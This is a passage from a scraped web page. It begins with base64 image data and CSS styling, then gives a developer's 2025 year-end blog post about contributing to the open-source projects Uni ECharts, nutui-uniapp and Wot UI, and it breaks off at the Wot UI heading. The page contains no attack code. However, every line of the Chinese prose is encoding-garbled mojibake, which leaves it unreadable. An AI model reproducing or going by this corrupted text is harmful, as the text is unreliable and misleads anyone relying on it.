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");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,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");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85f9e1f6baea4290803651838681af9f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb2hlMDYwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603668&amp;x-signature=GIDuk4QbQEHaWUaWclztXdN5J7I%3D" alt="" loading="lazy"/></p>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°ä½•ã€‚</p>
<p>å­¦ç”Ÿæ—¶ä»£æ€»è§‰å¾—æ—¶é—´å¾ˆæ¼«é•¿ï¼Œä¸€èŠ‚è¯¾å¾ˆé•¿ã€ä¸€å­¦æœŸæ›´é•¿ï¼Œæœªæ¥ä»¿ä½›æ°¸è¿œéƒ½åœ¨å¾ˆè¿œçš„åœ°æ–¹ã€‚åæ¥èµ°è¿›å·¥ä½œï¼Œæ—¶é—´å¥½åƒè¢«æŒ‰ä¸‹å¿«è¿›é”®ï¼Œéœ€æ±‚ã€è¿­ä»£ã€ä¸Šçº¿â€¦â€¦åœ¨ä¸€æ¬¡æ¬¡å¾ªç¯ä¸­ï¼Œæ—¥å†æ‚„æ‚„ç¿»åˆ°äº†å¹´æœ«ã€‚</p>
<p>å›è¿‡ç¥æ¥ï¼Œæ‰æ„è¯†åˆ° 2025 å¹´å·²ç»èµ°åˆ°äº†ç»ˆç‚¹ã€‚</p>
<p>è¿™ä¸€å¹´é‡Œï¼Œæœ‰æ•²è¿‡çš„ä»£ç ï¼Œæœ‰å†™ä¸‹çš„æ–‡å­—ï¼Œä¹Ÿæœ‰ä¸€äº›æ•£è½å´æœªæ›¾ä¸¢å¤±çš„ç¬é—´ï¼Œå®ƒä»¬æˆ–è®¸ä¸ç®—è½°è½°çƒˆçƒˆï¼Œä½†éƒ½ç¡®ç¡®å®å®åœ°æ„æˆäº†æˆ‘çš„ 2025ã€‚</p>
<h2 data-id="heading-0">ğŸš€ å¼€æºåˆ†äº«</h2>
<p>2025 å¹´æ˜¯æˆ‘å‚ä¸å¼€æºçš„ç¬¬ 2 å¹´ï¼Œåœ¨å¿™ç¢Œçš„å·¥ä½œä¹‹ä½™ï¼Œæˆ‘ä¼šå°½é‡æŠ½å‡ºä¸€äº›ä¸šä½™æ—¶é—´ï¼Œæˆ–æ˜¯è´¡çŒ®ä»£ç ã€ç»´æŠ¤é¡¹ç›®ï¼Œæˆ–æ˜¯åœ¨ç¤¾åŒºäº¤æµå¿ƒå¾—ã€‚è™½ç„¶æ¯ä¸€æ¬¡æäº¤éƒ½ä¸ç®—æƒŠå¤©åŠ¨åœ°ï¼Œä½†æ¯ä¸€æ¬¡äº¤æµå’Œåé¦ˆéƒ½è®©æˆ‘æ„Ÿå—åˆ°å¼€æºçš„åŠ›é‡ï¼Œä¹Ÿè®©æˆ‘åœ¨å®è·µä¸­ä¸æ–­æˆé•¿ã€‚</p>
<h3 data-id="heading-1">Uni ECharts</h3>
<blockquote>
<p>é¡¹ç›®é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaohe0601%2Funi-echarts" target="_blank" title="https://github.com/xiaohe0601/uni-echarts" ref="nofollow noopener noreferrer">github.com/xiaohe0601/â€¦</a></p>
</blockquote>
<p>Uni ECharts æ˜¯é€‚ç”¨äº uni-app çš„ Apache ECharts ç»„ä»¶ï¼Œè¿™æ˜¯æˆ‘ç¬¬ä¸€ä¸ªè‡ªå·±å‘èµ·çš„ç»„ä»¶ç±»å¼€æºé¡¹ç›®ï¼Œå‚è€ƒç¤¾åŒºä¸­å…¶ä»–åŒç±»çš„ä¼˜ç§€ä½œå“å†åŠ å…¥äº†ä¸€äº›è‡ªå·±çš„æ€è€ƒï¼Œå¸Œæœ›å°½å¯èƒ½å®ç°åœ¨ uni-app ä¸Šæ‹¥æœ‰ä¸ Vue ECharts ä¸€è‡´çš„ä½¿ç”¨ä½“éªŒã€‚</p>
<p>åœ¨ 1 æœˆ 26 æ—¥æ­£å¼ä¸Šçº¿ 0.0.1 ç‰ˆæœ¬ä»¥æ¥ï¼Œè‡³ä»Šæœ‰ 274 æ¬¡ commitï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»Šå¹´åœ¨å¼€æºä¸ŠæŠ•å…¥ç²¾åŠ›æœ€å¤šçš„ä¸€ä¸ªé¡¹ç›®ã€‚</p>
<p>å¾ˆé«˜å…´æœ‰ä¸€äº›æœ‹å‹èƒ½å¤Ÿä¸æˆ‘ä¸€èµ·å…±åŒå»ºè®¾ Uni EChartsï¼Œæ„Ÿè°¢ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOFreshman" target="_blank" title="https://github.com/OFreshman" ref="nofollow noopener noreferrer">@Ethan Yin</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjavenwang" target="_blank" title="https://github.com/javenwang" ref="nofollow noopener noreferrer">@javenwang</a> å’Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fannoyc" target="_blank" title="https://github.com/annoyc" ref="nofollow noopener noreferrer">@kevin</a> çš„ PRã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c486abcac944add8265a6479bf14450~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb2hlMDYwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603668&amp;x-signature=kSTofKBdWZZqNCjL090%2BjvvvLkU%3D" alt="" loading="lazy"/></p>
<p>ç‰¹åˆ«æ„Ÿè°¢ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwot-ui.cn" target="_blank" title="https://wot-ui.cn" ref="nofollow noopener noreferrer">Wot UI</a> ä½œè€… <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMoonofweisheng" target="_blank" title="https://github.com/Moonofweisheng" ref="nofollow noopener noreferrer">@ä¸å¦‚æ‘¸é±¼å»</a>ï¼Œä»–æ‹¥æœ‰ä¸°å¯Œçš„ uni-app ç»„ä»¶å¼€å‘ç»éªŒï¼ŒæŒ‡å¯¼æˆ‘è§£å†³äº†ç”±äº Vite å¯¹ Uni ECharts <strong>ä¾èµ–é¢„æ„å»º</strong> å¯¼è‡´ç”Ÿæˆé¢å¤– echarts å‰¯æœ¬çš„é—®é¢˜ï¼Œè®© Uni ECharts çš„ npm ç‰ˆæœ¬ç»ˆäºèƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨ã€‚</p>
<p>çŸ¥åå‰ç«¯å¼€æºå¤§ä½¬ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fantfu" target="_blank" title="https://github.com/antfu" ref="nofollow noopener noreferrer">@antfu</a> åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fantfu.me%2Fposts%2Fabout-yak-shaving-zh" target="_blank" title="https://antfu.me/posts/about-yak-shaving-zh" ref="nofollow noopener noreferrer">ã€Šå…³äº Yak Shavingã€‹</a> ä¸­åˆ†äº«ä»–å‚ä¸å¼€æºçš„ç¬¬ä¸€ä¸ªå°ç›®æ ‡æ˜¯è·å¾— 100 Starsï¼Œæ‰€ä»¥æˆ‘ä¹Ÿæ•ˆä»¿ä»–ç»™ Uni ECharts å®šä¸‹äº†ä»Šå¹´è·å¾— 100 Stars çš„ç›®æ ‡ï¼Œå¾ˆé—æ†¾ï¼Œæˆªè‡³ç›®å‰ Stars æ•°åœç•™åœ¨äº† 88ï¼Œå¦‚æœ Uni ECharts å¯¹ä½ æœ‰å¸®åŠ©çš„è¯è¯·ç»™æˆ‘ä¸€ä¸ª ğŸŒŸ é¼“åŠ±å§ ï½</p>
<h3 data-id="heading-2">nutui-uniapp</h3>
<blockquote>
<p>é¡¹ç›®é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnutui-uniapp%2Fnutui-uniapp" target="_blank" title="https://github.com/nutui-uniapp/nutui-uniapp" ref="nofollow noopener noreferrer">github.com/nutui-uniapâ€¦</a></p>
</blockquote>
<p>nutui-uniapp æ˜¯ç”± <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyang1206" target="_blank" title="https://github.com/yang1206" ref="nofollow noopener noreferrer">@yang1206</a> å‘èµ·çš„é€‚ç”¨äº uni-app çš„äº¬ä¸œé£æ ¼è½»é‡çº§ç§»åŠ¨ç«¯ç»„ä»¶åº“ï¼Œéå¸¸æ„Ÿè°¢ä»–çš„ä¿¡ä»»ï¼Œé‚€è¯·æˆ‘æˆä¸ºé¡¹ç›®çš„ Collaboratorã€‚</p>
<p>è¿™æ˜¯æˆ‘å¼€æºç”Ÿæ¶¯ç¬¬ä¸€æ¬¡æ·±åº¦å‚ä¸çš„é¡¹ç›®ï¼Œä» 2023 å¹´ 10 æœˆ 7 æ—¥çš„ç¬¬ 1 ä¸ª PR å¼€å§‹ï¼Œè‡³ä»Šæ€»å…±è´¡çŒ®äº†åŒ…æ‹¬ 151 æ¬¡ commit çš„ 107 ä¸ª PRã€‚</p>
<p>ä»Šå¹´ç”±äºå·¥ä½œå’Œç”Ÿæ´»ç­‰å…¶ä»–åŸå› ï¼Œå¯¹ nutui-uniapp çš„æŠ•å…¥ç›¸å¯¹å°‘äº†ä¸€äº›ï¼Œä¸è¿‡åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcrazh3" target="_blank" title="https://github.com/crazh3" ref="nofollow noopener noreferrer">@crazh3</a> çš„ååŠ©ä¸‹ç»ˆäºå®Œæˆäº†æç½® 1 å¹´çš„æ–‡æ¡£æ•´ç†å·¥ä½œï¼ˆissue <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnutui-uniapp%2Fnutui-uniapp%2Fissues%2F430" target="_blank" title="https://github.com/nutui-uniapp/nutui-uniapp/issues/430" ref="nofollow noopener noreferrer">#430</a>ã€pr <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnutui-uniapp%2Fnutui-uniapp%2Fpull%2F499" target="_blank" title="https://github.com/nutui-uniapp/nutui-uniapp/pull/499" ref="nofollow noopener noreferrer">#499</a>ï¼‰ï¼Œä½¿å¾— nutui-uniapp åœ¨ WebStorm ä¸­æ‹¥æœ‰äº†è‰¯å¥½çš„ä»£ç æç¤ºã€‚</p>
<p>ä¹Ÿæ„Ÿè°¢ç¤¾åŒº <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhzlzsm" target="_blank" title="https://github.com/hzlzsm" ref="nofollow noopener noreferrer">@hzlzsm</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhuaerss" target="_blank" title="https://github.com/huaerss" ref="nofollow noopener noreferrer">@sakura</a> å’Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fw934423231" target="_blank" title="https://github.com/w934423231" ref="nofollow noopener noreferrer">@Sofia Wilson</a> ç­‰æœ‹å‹è´¡çŒ®çš„ PRï¼Œæ˜¯å¤§å®¶è®© nutui-uniapp æ›´åŠ å®Œå–„ï¼</p>
<h3 data-id="heading-3">Wot UI</h3>
<blockquote>
<p>é¡¹ç›®é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMoonofweisheng%2Fwot-design-uni" target="_blank" title="https://github.com/Moonofweisheng/wot-design-uni" ref="nofollow noopener noreferrer">github.com/Moonofweishâ€¦</a></p>
</blockquote>
